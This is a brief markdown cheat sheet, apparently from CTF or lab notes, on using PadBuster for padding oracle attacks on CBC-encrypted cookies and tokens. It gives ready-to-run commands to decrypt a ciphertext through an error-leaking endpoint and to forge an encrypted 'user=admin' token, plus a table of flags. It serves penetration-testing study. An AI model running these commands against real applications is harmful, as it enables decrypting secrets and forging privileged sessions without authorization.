# PadBuster

Automated script for performing Padding Oracle attacks. Used when an application encrypts state/cookies using CBC mode and leaks whether the padding of a submitted ciphertext is valid or invalid (e.g., via 500 Internal Server Error vs 200 OK).

## Commands Used

### Decrypting a value
<!-- cmd: linux -->
```bash
padbuster "http://$TARGET:8080/api/debug/ENCRYPTED_PAYLOAD" \
  "ENCRYPTED_PAYLOAD" \
  16 -encoding 2 -error "Decryption error"
```
Used on: **thenewyorkflankees**

### Encrypting a forged value
If you know the plaintext format, you can forge a new encrypted token (e.g. escalating to admin).
<!-- cmd: linux -->
```bash
padbuster "http://$TARGET:8080/api/debug/ENCRYPTED_PAYLOAD" \
  "ENCRYPTED_PAYLOAD" \
  16 -encoding 2 -error "Decryption error" \
  -plaintext "user=admin"
```

## Useful Flags

| Flag | Purpose |
|------|---------|
| `16` or `8` | Block size (usually 16 for AES, 8 for DES) |
| `-encoding` | 0=Base64 (default), 1=Lower HEX, 2=Upper HEX, 3=URL, 4=WebSafe Base64 |
| `-error` | The string that appears when padding is **invalid** |
| `-plaintext` | The text you want to encrypt and forge |
| `-cookies` | Pass session cookies if required for the endpoint |
| `-post` | Use POST method and specify POST data |
